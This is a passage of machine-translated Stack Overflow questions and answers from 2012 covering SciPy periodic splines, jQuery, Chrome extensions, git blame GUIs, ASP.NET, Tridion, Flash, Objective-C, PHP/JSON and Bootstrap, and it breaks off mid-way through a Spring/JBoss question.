        14.605,  14.596,  14.61 ,  14.6  ,  14.582,  14.609,  14.606,
        14.619,  14.601,  14.612,  14.619,  14.612,  14.612,  14.618,
        14.619,  14.62 ,  14.62 ,  14.619,  14.633,  14.629,  14.611,
        14.62 ,  14.629,  14.618,  14.645,  14.634,  14.633,  14.644,
        14.647,  14.649,  14.67 ,  14.661,  14.658,  14.67 ,  14.667,
        14.682,  14.676,  14.675,  14.68 ,  14.67 ,  14.673,  14.676,
        14.68 ,  14.654,  14.689,  14.699,  14.694,  14.691,  14.699,
        14.703,  14.683,  14.691,  14.706,  14.703,  14.715,  14.73 ,
        14.727,  14.72 ,  14.729,  14.718,  14.712,  14.721,  14.734,
        14.722,  14.738,  14.724,  14.73 ,  14.729,  14.735,  14.751,
        14.741,  14.752,  14.753,  14.765,  14.758,  14.759,  14.766,
        14.766,  14.774,  14.774,  14.768,  14.775,  14.789,  14.788,
        14.793,  14.787,  14.783,  14.808,  14.789,  14.793,  14.804,
        14.804,  14.793,  14.805,  14.808,  14.811,  14.825,  14.816,
        14.827,  14.827,  14.827,  14.838,  14.83 ,  14.839,  14.848,
        14.844,  14.834,  14.838,  14.845,  14.861,  14.856,  14.847,
        14.853,  14.868,  14.845,  14.857,  14.859,  14.859,  14.868,
        14.853,  14.871,  14.873,  14.875,  14.893,  14.882,  14.883,
        14.884,  14.899,  14.904,  14.907,  14.909,  14.903,  14.909,
        14.909,  14.91 ,  14.911,  14.904,  14.909,  14.933,  14.923,
        14.924,  14.907,  14.928,  14.913,  14.939,  14.944,  14.946,
        14.952,  14.935,  14.946,  14.943,  14.948,  14.952,  14.957,
        14.974,  14.981,  14.967,  14.967,  14.977,  14.987,  14.97 ,
        15.013,  14.98 ,  15.011,  15.004,  15.013,  15\.   ,  15.017,
        15.02 ,  15.047,  15.03 ,  15.05 ,  15.029,  15.043,  15.038,
        15.03 ,  15.042,  15.052]) 
```

该函数应在 0 处计算为（几乎）与 1 相同的数字，因为基础数据是周期性的（就像我们期望插入正弦的函数在 0 处具有与 2pi 处相同的值）。然而，它显然有很长的左偏，并且与 0 附近的数据不太相似。0 和 1 处的值之间的差异大约为 0.144，大于数据集的标准偏差。

有什么想法吗？我可以在设置固定点时以某种方式进行插值，即边界的开始和结束应该大致相同的规范吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T12:32:44.017

`splrep`/对`splev`函数声称支持周期性样条，参见`per`参数。

它在 UnivariateSpline 中不可用是一个错误。这是一个最小的实现（但最好不要使用它，因为访问`_data`可能不向后兼容）：

```
from scipy.interpolate import UnivariateSpline, splrep

class PeriodicUnivariateSpline(UnivariateSpline):
    def __init__(self, x, y, w=None, bbox=[None]*2, k=3, s=0):
        #_data == x,y,w,xb,xe,k,s,n,t,c,fp,fpint,nrdata,ier
        tck, fp, ier, msg = splrep(x, y, k=k, w=w, xb=bbox[0], xe=bbox[1],
                                   s=s, per=1, full_output=1)
        self._data = (x,y,w,bbox[0],bbox[1],k,s,len(tck[0]),tck[0],tck[1],
                      fp,None,None,ier)
        self._reset_class() 
```

# jquery - .animate() - 旧 jquery 版本（Drupal）冲突的队列模拟

> ID：13490536
> 
> 赞同：7
> 
> 时间：2012-11-21T09:53:58.003
> 
> 标签：jquery, drupal, module, jquery-animate, queue

我正在寻找一个解决方案来推出 jquery 版本，Drupal 原生包含该版本。它是一个旧版本。实际上没有问题-但是一个：DI使用带有队列假的.animate（）函数，并且没有此属性（因为此属性在jquery 1.7中添加到.animate（）中），它不是我想要的动画。

代码是：

```
//When mouse rolls over
$("#login").bind('mouseover mouseenter',function(){
$("#logo").stop().delay(500).animate({top:'-44px'},{queue:false, duration:600, easing: 'swing'})

$("#login").stop().animate({top:'89px'},{queue:false, duration:600, easing: 'easeOutBounce'})
});

//When mouse is removed
$("#login").bind('mouseout mouseleave',function(){
$("#logo").stop().animate({top:'6px'},{queue:false, duration:600, easing: 'easeOutBounce'})

$("#login").stop().animate({top:'40px'},{queue:false, duration:600, easing: 'swing'})
}); 
```

也许你能帮我找到解决办法？问题，为什么我要排除我用于此的 jquery 版本（1.8.3）是 Drupal 模块没有显示所见即所得（CKEditor），当 jquery 1.8.3 被额外包含时，不幸的是我不能替换 jquery带有 jquery 1.8.3 的核心版本 :(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T22:47:44.513

我总是通过普通的香草 js 做到这一点；通过简单地触发延迟/超时事件。这解决了队列问题。

[在 JsFiddle 上查看。](http://jsfiddle.net/bkjcb/8/ "延迟注册事件")

```
 <style type="text/css">
 .redBlock{
     height:2em;
     background-color:red;
     color:white;
     border:2px solid silver;
 }​
 </style>
 <input type="button" id="testFoo" value="click me a bunch of times super fast" />
 <div id="testBar" style="width:100px;" class="redBlock"> Red Block </div>​
 <script type="text/javascript">
    $(document).ready(function(){
        $("#testFoo").click(function(){
             fireOneAnimateEvent();
         });
    });
    function animateRedBlock() {
       $("#testBar").css('width', '100px')
            .animate({
                 width: ($("#testBar").width() * 3) + "px"
            }, 500, function () { });
    }
    var delay = (function () {
       var timer = 0;
       return function (callback, ms) {
           clearTimeout(timer);
           timer = setTimeout(callback, ms);
       };
    })();
    function fireOneAnimateEvent() {
       delay(function () {
           animateRedBlock();
       }, 500);
    }​
 </script> 
```

# javascript - Chrome extension on Mac OS X: Window popups disappear

> ID：13490538
> 
> 赞同：4
> 
> 时间：2012-11-21T09:54:00.230
> 
> 标签：javascript, macos, google-chrome, google-chrome-extension

**Problem**
From within a Chrome extension's popup page, using any JavaScript method to cause a window popup results in the popup window animating but, as soon as the content of the window is populated, instantly losing focus and disappearing.

The weird thing is that, the popup window will stay open as long as Chrome's developer tools are opened in the context of the extension, but the popup window will immediately disappear if the developer tools are closed.

This used to happen on my old, messed-up 2006 iMac, so I thought it was an issue with my configuration. However, I've just done a fresh install of both Mac OS X (v1.7.5) and Chrome (v23.0.1271.97) on a 2007 iMac and created a *very* simple Chrome extension (code below) to test and it's *still* happening. I can't help but think this is a bug with Chrome.

**Code**

"manifest.json"

```
{
    "name": "Test Popups",
    "version": "0",

    "manifest_version": 2,

    "browser_action": {
        "default_popup": "popup.html"
    }
} 
```

"popup.html"

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title></title>

        <script src="popup.js"></script>
    </head>

    <body>
        <input type="submit" id="btn_Alert" value="Alert" />
        <input type="submit" id="btn_Confirm" value="Confirm" />
        <input type="submit" id="btn_Prompt" value="Prompt" />
    </body>
</html> 
```

"popup.js"

```
document.onreadystatechange = function(){
    if (document.readyState === "complete"){
        attach_eventListeners();
    }
}

function attach_eventListeners(){
    var btn_Alert = document.getElementById("btn_Alert");
    var btn_Confirm = document.getElementById("btn_Confirm");
    var btn_Prompt = document.getElementById("btn_Prompt");

    btn_Alert.addEventListener("click", function(){
        window.alert("Test");
    }, false);
    btn_Confirm.addEventListener("click", function(){
        window.confirm("Test");
    }, false);
    btn_Prompt.addEventListener("click", function(){
        window.prompt("Test", "");
    }, false);
} 
```

Here's a [link to a ZIP of these files](https://dl.dropboxusercontent.com/u/27573003/Distribution/Binaries/Mac-Chrome_ExtensionTest.zip). To test them yourself:

1.  Extract the ZIP
2.  In Chrome, go to `chrome://chrome/extensions/`
3.  Check the "Developer mode" checkbox in the top right
4.  Click "Load unpacked extension..." in the top left
5.  Select the folder containing the extracted files
6.  Click "OK"

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-05-09T09:33:42.413

As far as I understand, popup windows cannot lose focus, or they are immediately closed. Having developer tools open for inspecting overrides this policy.

Using `alert`, `confirm`, `prompt` causes the popup window to lose focus and therefore it is closed by Chrome.

# silverlight - 如何绑定列表 到 RadGridView 数据列

> ID：13490540
> 
> 赞同：0
> 
> 时间：2012-11-21T09:54:05.420
> 
> 标签：silverlight, xaml, data-binding, gridview, telerik

我正在为 Silverlight 使用 Telerik RadControls，我需要在一列中绘制字符串列表。我已将列的 cellStyle 绑定到一种样式，并在该样式中添加了我的 ListCellPresenter 控件的实例。我的控件使用依赖属性 DataList 接收其内部数据。如何将需要绘制的实际数据绑定到 GridView，以便在 ListCellPresenter 中可以访问？

```
<Grid x:Name="LayoutRoot">
    <telerik:RadGridView x:Name="gvMain" AutoGenerateColumns="True">
        <telerik:RadGridView.Columns>
            <telerik:GridViewDataColumn Width="200" CellStyle="{StaticResource listStyle}" Header="New Column">
            </telerik:GridViewDataColumn>
        </telerik:RadGridView.Columns>
    </telerik:RadGridView>
</Grid> 
```

这里的风格：

```
<UserControl.Resources>
    <Style TargetType="grid:GridViewCell" x:Key="listStyle">
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="grid:GridViewCell">
                    <local:ListCellPresenter DataList="{Binding DataList}"></local:ListCellPresenter>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>
</UserControl.Resources> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:01:12.220

它应该很简单——只需使用`DataMemberBinding`指向包含要绑定到的列表的行对象的属性。IE：

```
<gridView:GridViewDataColumn 
    CellStyle="{StaticResource listStyle}" Header="New Column"  
    DataMemberBinding="{Binding TheListProperty}" /> 
```

（假设这里的`ItemsSource`of the`RadGridView`类似于`IEnumerable<MyModel>`where`MyModel`包含您的目标`List<string> TheListProperty`。）

# macos - Mac OS - 自动更新 DMG

> ID：13490541
> 
> 赞同：1
> 
> 时间：2012-11-21T09:54:09.803
> 
> 标签：macos, dmg

我在 Mac OS 上创建了一个应用程序。现在，我需要使用自动更新功能。我尝试使用 Sparkle 框架，但上传时出现错误 你有什么方法可以在 Mac OS 上为应用程序自动更新吗？

# jquery - getchangedcells 返回空数组

> ID：13490543
> 
> 赞同：1
> 
> 时间：2012-11-21T09:54:13.730
> 
> 标签：jquery, jqgrid, struts2

更改单元格的值后，我调用`getchangedcells`但返回的数组始终为空。这是我的 jqgrid（我正在使用 struts2-jquery 插件）：

```
<sjg:grid id="tableau" 
      cellEdit="true"
      cellurl="%{editRequetesUrl}"
      dataType="json" href="%{listeRequetesUrl}"  
      gridModel="requetesRoutage"
      multiselect="true"
      width="940" onCompleteTopics="complete" rowNum="-1"
      >
    <sjg:gridColumn formatter="modifyRequeteFormatter"
        width="20" name="act2" index="act2" title="" align="center"
        sortable="false"/>

    <sjg:gridColumn title="" formatter="deleteFormatter"
                name="act" index="act" width="20" sortable="false"
                align="center" />

    <sjg:gridColumn name="id" index="id"
                title="" hidden="true" sortable="false" />

    <sjg:gridColumn name="requete.nomRequete" index="type"
                title="%{getText('label.abonnement.type1')}"
                sortable="true" />

    <sjg:gridColumn name="codeEdition.libelle" index="codeEdition"
                title="%{getText('label.abonnement.codeEdition')}"
                editable="true" edittype="text" sortable="true" />

    <sjg:gridColumn name="nombreExemplaire" index="nombreExemplaire"
                title="%{getText('label.routage.nbExemplaires')}"
                editable="true" edittype="text" formatter="integer"
                sortable="true" />

</sjg:grid> 
```

调试时我发现单元格得到了类`dirty-cell`，而行得到了`edited`

# git - 有没有类似于 bzr qannotate 的 git blame gui？

> ID：13490544
> 
> 赞同：24
> 
> 时间：2012-11-21T09:54:16.677
> 
> 标签：git, bazaar, blame

作为前`bzr`用户和新手，`git`我正在尝试为`git blame`类似于`bzr qannotate`. 后者有2个主要观点：

1.  带有简短注释信息的文件内容查看器（谁，在哪个版本中更改了行）+基于提交者 ID 和更改年龄的背景着色。
2.  文件日志查看器：当我单击文件内容中的行时，我可以看到该行更改时的修订以及有关它的所有日志信息。

截屏： ![在此处输入图像描述](../Images/0764e1d74b1199108cfea5ecf26b55db.png)

我看到 XCode IDE 内置了类似的东西，虽然它在编辑器窗口内，因此不是很方便。

到目前为止，我已经尝试过 GitX 0.7.1 和 Mac 版 GitHub——它们都没有“责备”。

我刚刚检查了适用于 Mac 的 SourceTree，虽然它有责备支持，但它相当简陋，显示的内容几乎与 command-line 相同`git blame`，尽管我可以双击该行以在另一个窗口中查看相应的修订和更改。那还不如`bzr qannotate`。

还有其他我可以使用的 GUI 工具吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-21T23:01:37.960

[`tig`](https://jonas.github.io/tig/)FTW！

按`t`你得到树视图。然后，按下`B`会显示`git blame`突出显示的文件。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-02-28T08:11:58.127

更简单的方法可能是`git gui blame <arguments>`. 您可以使用`git gui --help`有关参数的更多信息。[这里](https://git-scm.com/docs/git-gui)是官方来源

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-21T22:52:23.187

`git gui`有这个功能，但它没有那么完美。转到“存储库”->“浏览主文件”（或“浏览分支文件”以获得不同的分支）-> 双击文件名。它是基本的，在这一点上似乎没有很多可配置性，但它是功能性的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-06-04T20:52:02.353

查看[Git Extensions](http://gitextensions.github.io/)，看看这是否是您正在寻找的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-21T12:02:12.613

**Aptana Studio**、**SublimeText**和**TextMate**的可视化效果与您在那里的类似，但没有颜色。您可以配置[emacs](http://www.saltycrane.com/blog/2011/05/colorized-interactive-git-blame-emacs-vc-annotate/)或[vim](https://github.com/tpope/vim-fugitive)以显示彩色版本。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-03-02T05:07:03.377

## `git blametool`

我写了一个简单的包装器`git blame`，效果很好。我称之为`git blametool`。[在我的 eRCaGuy_dotfiles 存储库中](https://github.com/ElectricRCAircraftGuy/eRCaGuy_dotfiles/blob/master/useful_scripts/git-blametool.sh)获取它。调用会在您选择的“blametool”中`git blametool`打开`git blame`输出——它可以是*任何*文本编辑器。`vim`文本编辑器`emacs`的示例包括：`gedit`、、、、、`nano`Sublime Text 3（`subl`默认值和我的首选）等。

## 安装

有关最新的安装说明，请参阅[**git-blametool.sh**](https://github.com/ElectricRCAircraftGuy/eRCaGuy_dotfiles/blob/master/useful_scripts/git-blametool.sh)本身顶部的注释。有很多方法可以做到这一点，但这里有一些可能的安装说明：

```
mkdir ~/dev  # make development dir
cd ~/dev
git clone https://github.com/ElectricRCAircraftGuy/eRCaGuy_dotfiles.git
cd eRCaGuy_dotfiles/useful_scripts
# make symbolic link to "git-blametool.sh" inside ~/bin
mkdir -p ~/bin 
ln -si "${PWD}/git-blametool.sh" ~/bin/git-blametool 
```

关闭并重新打开您的终端。假设`~/bin`是您的一部分（如果您创建目录然后注销并重新登录`PATH`，默认情况下它在 Ubuntu上），现在您可以访问，它可以简单地运行为.`~/bin``git-blametool``git blametool`

运行`git blametool -h`完整的帮助菜单。

设置你的 blametool 编辑器（详见`git blametool -h`）：

```
# set your blametool editor as Sublime Text 3 (its command-line executable is 'subl'):
git config --global blametool.editor subl

# Other popular choices:
git config --global blametool.editor vim
git config --global blametool.editor emacs
git config --global blametool.editor nano
git config --global blametool.editor gedit
git config --global blametool.editor leafpad 
```

如果您没有 Sublime Text 3，请获取它：[https](https://www.sublimetext.com/3) ://www.sublimetext.com/3 。

安装**Git**插件，这样你就会得到“git blame”语法高亮：`Ctrl`+ `Shift`+ `P`--> “Package Control: Install Package” --> 输入“Git”并选择那个包。

## 用法

现在跑`git blametool`！它是一个包装器，`git blame`因此它接受*任何*接受的选项`git blame`！

示例用法：

```
git blametool -h  # help menu
git blametool somefile.c
git blametool somebranch somefile.c 
```

## 演示

在您刚刚在上面克隆的我的[eRCaGuy_dotfiles 存储](https://github.com/ElectricRCAircraftGuy/eRCaGuy_dotfiles)库中，运行：

```
git blametool useful_scripts/git-diffn.sh 
```

你会看到这样的东西： [![在此处输入图像描述](../Images/c84a70b7e0e099a0dff90e153a71f2ad.png)](https://i.stack.imgur.com/6thE7.jpg)

让我们深入研究。在第 8 行，我看到了 commit hash `68e96491`，所以我在 Sublime Text 中双击它并复制它。现在我可以在终端中运行它：

```
git blametool 68e96491 useful_scripts/git-diffn.sh 
```

现在我看到了： [![在此处输入图像描述](../Images/8a5d72fc03c4f73fc226ad1ff6808c5f.png)](https://i.stack.imgur.com/Ed4Oe.jpg)

请注意，现在在 Sublime Text 3 中打开了 2 个选项卡，每个选项卡都显示来自`git blame`文件名的提交哈希。我想深入挖掘，所以我从第一行复制哈希并运行：

```
git blametool c294f965 useful_scripts/git-diffn.sh 
```

它在 Sublime Text 3 中打开了`git blame`第三个选项卡。现在我看到了： [![在此处输入图像描述](../Images/95e0afe33e49915482898179b11415a3.png)](https://i.stack.imgur.com/5D4oE.jpg)

我可以轻松地点击 3 个标签。凉爽的。现在想象一下我找到了我正在寻找的东西，所以为了查看并排比较，我运行它来查看 commit hash`c294f965`和`68e96491`in之间的比较`meld`：

```
git difftool 68e96491 68e96491 useful_scripts/git-diffn.sh 
```

这就是我所看到的： [![在此处输入图像描述](../Images/4d93f2890910e420a86ead9239ea6da5.png)](https://i.stack.imgur.com/qNS1l.jpg)

如果您还没有`meld`设置，请按照我在此处的回答中的说明进行操作：[Git mergetool with Meld on Windows](https://stackoverflow.com/questions/14821358/git-mergetool-with-meld-on-windows/48979939#48979939)。

## 替代品`git blametool`

以下是一些替代方案：

1.  **GitHub**
    1.  只需导航到 GitHub 上的存储库中的文件，然后单击“Blame”链接[，如下所示](https://github.com/ElectricRCAircraftGuy/eRCaGuy_dotfiles/blob/master/useful_scripts/git-diffn.sh)：[![在此处输入图像描述](../Images/7768b52b111f1ad5f51b0eb93ac4970a.png)](https://i.stack.imgur.com/fgJUF.png).
    2.  您现在将`git blame`在 GitHub 中看到像这样的漂亮视图。请注意，您可以单击这些时髦的窗口图标以进一步了解`git blame`历史：[![在此处输入图像描述](../Images/a0b15664e5b40489ee0c0eab29a89623.png)](https://i.stack.imgur.com/CD5M3.jpg). 例如，单击上图中的那个就像 running `git blametool 68e96491 useful_scripts/git-diffn.sh`，因为该`git blametool`行的输出显示`68e96491`的是它的提交哈希。
2.  **“Git Blame”Sublime Text 3 包**。我更喜欢我的`git blametool`，但这也是一个选择：
    1.  [https://packagecontrol.io/packages/Git%20blame](https://packagecontrol.io/packages/Git%20blame)
    2.  [https://github.com/frou/st3-gitblame](https://github.com/frou/st3-gitblame)

## 也可以看看

1.  很有用！查看单个文件的编辑历史！

    ```
    git log -p somefile.c 
    ```

    灵感来源：[Git 责备——之前的提交？](https://stackoverflow.com/questions/5098256/git-blame-prior-commits/32396682#32396682)
2.  [我的回答] [Windows 上使用 Meld 的 Git 合并工具](https://stackoverflow.com/questions/14821358/git-mergetool-with-meld-on-windows/48979939#48979939)

[关键词：`git blametool`; `git blame`在您选择的编辑器中打开]

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-12-01T01:26:53.820

有点晚了，但[GitKraken 很好地](https://www.gitkraken.com/)支持[历史](https://support.gitkraken.com/working-with-commits/diff#file-blame-and-history)和[责备](https://support.gitkraken.com/working-with-commits/diff#file-blame-and-history)。

# asp.net - 设置中继器内复选框的文本

> ID：13490548
> 
> 赞同：0
> 
> 时间：2012-11-21T09:54:24.643
> 
> 标签：asp.net, html, checkbox, webforms, repeater

```
<ItemTemplate>
        <tr>
        <td>
            <asp:CheckBox runat="server" Text="<%#Container.DataItem('Text')%>" />  
        </td>
        </tr>
    </ItemTemplate> 
```

如何从绑定字段（也称为文本）中设置文本？我尝试了很多方法，比如 Val("") 但它总是说错误。

对于上面的示例，它说：编译器错误消息：CS1012：字符文字中的字符太多。

如果我将其更改为`<asp:CheckBox runat="server" Text="<%#Container.DataItem("Text")%>" />` -- 它会显示：解析器错误消息：服务器标签格式不正确。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:58:06.027

在转发器内绑定值时，您需要使用单引号。

代替..

`Text="<%#Container.DataItem('Text')%>"`

...尝试...

`Text='<%#Container.DataItem("Text")%>'`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:57:28.010

```
<ItemTemplate>
    <tr>
    <td>
        <asp:CheckBox runat="server" Text='<%# Eval("Text")%>' />  
    </td>
    </tr>
</ItemTemplate> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:59:44.187

```
<asp:CheckBox runat="server">(String)DataBinder.Eval(Container.DataItem, "Text")</asp:CheckBox> 
```

# installation - 是否可以强制 Tridion 2011 SP1 安装程序覆盖文件？

> ID：13490550
> 
> 赞同：2
> 
> 时间：2012-11-21T09:54:26.607
> 
> 标签：installation, tridion, tridion-2011

在 Tridion 2011 安装中应用 SP1 后，我们遇到了 Content Manager GUI 的一些问题： Internet 浏览器显示带有 JS 错误的空白页面。

前任：

```
[16:19:41,144] $dom is undefined @ http://localhost/WebUI/Editors/CME/Views/Dashboard/Dashboard_v6.1.0.55920.5_.aspx?mode=js:15 
```

在 Windows 资源管理器中，我们可以看到文件 %TRIDION_HOME%\web\webUI\Core\Client\Base\Utils\Css.js 没有被安装程序更新（修改日期）。

在安装程序日志中，我们发现了以下几行：

```
MSI (s) (C0:2C) [17:59:54:643]: File: F:\Tridion\web\WebUI\Core\Client\Base\Utils\Css.js;   Won't Overwrite;    Won't patch;    Existing file is unversioned but modified 
```

在检查了之前安装在此服务器上的补丁后，我发现一个包含 css.js 版本的补丁：CM_2011.0.1.76243。我想这就是安装程序不更新此文件的原因。

这是否意味着我们无法升级之前已修补的 Tridion 2011 环境？我们需要先卸载 Tridion 2011 还是有办法强制安装程序覆盖现有文件？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T14:25:22.650

支持人员已确认缺陷：

> 确实存在安装程序应将文件复制到已修改、更新或替换的文件系统的缺陷。目前（正如您所注意到的），通知这一点的唯一方法是查看安装程序日志并搜索“不会覆盖；不会打补丁；现有文件未版本化但已修改”消息。
> 
> 不需要首先卸载 SDL Tridion 2011 GA，而是查看安装程序日志，然后向我们请求有问题的文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T10:36:48.080

我认为确实没有这样的选项，我在升级手册中发现的一件事是：

> **卸载附加产品**
> 
> 如果您安装了任何附加产品，即使它们与 SDL Tridion 2011 SP1 兼容，也请卸载所有附加产品。兼容的附加组件最低限度需要卸载和重新安装。

猜猜这也适用于未版本化的补丁。所以如果安装程序日志只提到了那个文件，我会删除它并运行修复，看看你是否得到了正确的文件。或者如果可能，在执行升级之前将其删除。如果安装程序日志提到更多文件，请对这些文件执行相同操作。

*需要注意的一点是，如果该文件来自官方修补程序，我会将此问题报告给 SDL Tridion 客户支持（如果您手动更改了文件，您甚至可以考虑报告它）。可能是升级安装程序中的一个缺陷，它无法正确识别此（正式更改的）文件。当然可以改进的东西。*

# eclipse - 向上和向下键在 Eclipse 模板提案中不起作用

> ID：13490560
> 
> 赞同：0
> 
> 时间：2012-11-21T09:54:59.240
> 
> 标签：eclipse, keyboard-shortcuts

几天以来，我无法在 Eclipse *Template Proposals*中移动光标。

我按下`ctrl`- `space`，模板建议弹出，但是当我按下`↑`或时， `↓`Eclipse 将光标移动到文本中而**不是**模板建议中。

我应该在*Preferences* → *General* → *Keys*列表中设置哪些参数来恢复默认行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:03:50.043

为什么不在首选项 > 常规 > 按键中尝试“恢复默认值”？

# flash - Flash 将电影导出到 SWC，在 Flex ActionScript 项目中加载和播放

> ID：13490562
> 
> 赞同：0
> 
> 时间：2012-11-21T09:55:00.383
> 
> 标签：flash, apache-flex, actionscript, swc

我无法运行包含在 SWC 库中的 AS。我做了两个测试项目 - 一个在 Flash Pro 中 - 就像这里的答案中描述的那样：

[链接](https://stackoverflow.com/questions/11712478/imported-swc-movie-clip-not-being-displayed-flash-builder)

*   添加了一些动画蓝色圆圈的 AS3 代码。第二个项目 - Flash Builder 中的 Flex ActionScript Mobile 项目类型。

我将 Flash Pro 项目导出到 SWC，选中了“AS Linkage”框和“Export In Frame 1”框。然后我在项目属性中将 SWC 添加到 Flex 项目。我将 MovieClip 添加到舞台：

包裹 {

```
import ExportSWC_test_fla.*;

import flash.display.Sprite;
import flash.display.StageAlign;
import flash.display.StageScaleMode;
import flash.utils.getDefinitionByName;

public class BlueCircleRun extends Sprite
{
    public function BlueCircleRun()
    {
        super();

        stage.scaleMode = StageScaleMode.NO_SCALE;

        stage.align = StageAlign.TOP_LEFT;

        var symbol:BlueCircle = new BlueCircle();

        symbol.x = 150;

        symbol.y = 150;

        addChild(symbol);

    }
} 
```

}

当我编译和运行 Flex 项目时，我可以在舞台上看到 MovieClip。问题是 - 电影中的脚本没有运行。我怎样才能运行它？我可以从 SWC 导入和运行整部电影吗？我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:42:35.560

像这样的东西：

```
(symbol as MovieClip).play(); 
```

# objective-c - 使用分离的组件形成 NSArray 并使用重复元素形成另一个数组

> ID：13490565
> 
> 赞同：0
> 
> 时间：2012-11-21T09:55:03.767
> 
> 标签：objective-c, ios, xcode, nsmutablearray, nsarray

我有这样的元素数组

```
"Cosmetics~Sample~test1",
"Cosmetics~Sample~test2", 
```

我需要这样显示

化妆品 --sample --> test1,test2 （它像化妆品一样主要和化妆品子将是样品和样品子有 test1 和 test2 元素）像分支

```
 NSArray * seperate=[[NSArray alloc]init];
for (int i =0; i < jsonarray.count; i++) {
    NSString *sam=[[jsonarray valueForKey:@"category"]objectAtIndex:i]; 
    seperate=[sam componentsSeparatedByString:@"~"];       
    [cellarray addObject:[seperate objectAtIndex:0]];
} 
```

我已经用〜标记将它们分开了，但我无法像我提到的那样比较它们和表格......请帮助......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:21:52.367

`Merger`两个`array`没有重复的维护顺序如下：

```
NSArray *a= [NSArray arrayWithObjects:@"Cosmetics",@"Sample",@"test1", nil];
NSArray *b= [NSArray arrayWithObjects:@"Cosmetics",@"Sample",@"test2", nil];
NSMutableOrderedSet *setA = [NSMutableOrderedSet orderedSetWithArray:a];
NSOrderedSet *setB = [NSOrderedSet orderedSetWithArray:b];
[setA unionOrderedSet:setB];
NSLog(@"Merged One : %@", [[setA array] componentsJoinedByString:@" "]); 
```

# php - 如何使用 php 输出并在 jQuery 中进行比较？

> ID：13490567
> 
> 赞同：2
> 
> 时间：2012-11-21T09:55:07.813
> 
> 标签：php, jquery

`print_r($getPrice)`结果是：$getPrice 包含的元素不知道，它可以是 1 或 2 或类似以下（3 个元素）

```
Array
(
    [0] => Array
        (
            [price_qty] => 2
            [price] => 100.0000

        )

    [1] => Array
        (

            [price_qty] => 5
            [price] => 90.0000
        )

    [2] => Array
        (

            [price_qty] => 8
            [price] => 80.0000

        )

) 
```

jquery代码：[获取所有输入值并进行加法](https://stackoverflow.com/questions/13486148/get-all-the-input-value-and-make-an-addition)

```
$(document).ready(function() { //wrap in a document.ready event handler
    $('input').on('keyup', function() { 
        var result = 0;
        $('.liste_couleur_qty li input').each(function() {
            result += parseInt(this.value, 10);
        });
        $('div#qtyvalue').text(result); 
    });
});​ 
```

现在，我想将结果与`[price_qty]`数组`$getPrice`中的结果进行比较。如果结果小于 0，则使用结果乘以 [price]（来自 $getPrice 数组）值。

例如：

```
if result(from the jquery code) < 2, then price= result*110\. then $('div#qtyvalue').text(result); change to $('div#qtyvalue').text("the qty is "+result+" the price is "+price);

if between 2--5(contain 5), the price is 100\. if between 5--8(not contain 8), the price is 90 
```

怎么做？谢谢你。

有没有办法将 php 数组放入 javascript 数组中，然后进行比较？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:02:03.367

使用[`json_encode`](http://php.net/manual/function.json-encode.php)PHP 的函数将数组`$getPrice`转换为 JSON 字符串。然后将其分配给 JavaScript 变量。

**更新：**

```
<?PHP

$getPrice = array(
array("price_qty" => 2,"price" => 100.0000),
array("price_qty" => 4,"price" => 300.0000),
array("price_qty" => 6,"price" => 500.0000)
);

$json = json_encode($getPrice);

?> 
```

用 jQuery 解析它

```
<script>
    $(document).ready(function () {
    var parsedData = <?PHP echo $json; ?>;

    for(k in parsedData)
       alert(parsedData[k].price_qty);

    });
</script> 
```

# twitter-bootstrap - 基于响应式布局显示 Bootstrap Tooltip

> ID：13490571
> 
> 赞同：0
> 
> 时间：2012-11-21T09:55:34.403
> 
> 标签：twitter-bootstrap

我在将引导工具提示集成到`button`触摸设备上的元素时遇到了一些麻烦。在桌面布局上使用以下代码，当我将鼠标悬停在按钮上时，它将正确显示工具提示。如果我单击按钮，它会调用链接到按钮的 JavaScript（或 href 链接）。但是，在触摸设备上，由于没有悬停动作，因此当我单击按钮时会首先调用工具提示，并且必须再次单击它才能调用该动作。我该如何解决？

```
<button class="btn btn-mini btn-want" data-title="Buy" data-url="/buy/c66860de7d6d10000035" rel="tooltip" data-original-title="">
            <i class="icon-plus"></i>
          </button> 
```

我的一个想法是在 Bootstrap 中使用响应式类：http: [//twitter.github.com/bootstrap/scaffolding.html#responsive](http://twitter.github.com/bootstrap/scaffolding.html#responsive)

我认为可以工作的课程是：`.visible-desktop`和`.hidden-desktop`

这是正确的方法吗？如果是这样，我如何为桌面布局实现工具提示但为非桌面布局禁用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:59:13.250

您可以使用[Modernizr.touch](http://modernizr.com/docs/)来检测启用触摸的客户端 - 并为这些客户端禁用工具提示插件。

# spring - 如何在 Spring 中使用 JBoss 提供的 JNDI 数据源 - 错误的驱动程序类

> ID：13490572
> 
> 赞同：1
> 
> 时间：2012-11-21T09:55:34.863
> 
> 标签：spring, jboss7.x

我们的项目必须从下面的数据源配置切换到 JBoss AS 7.1.1 提供的 jndi 数据源。

应用程序上下文.xml：

```
...
<bean id="entityManagerFactory"
      class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
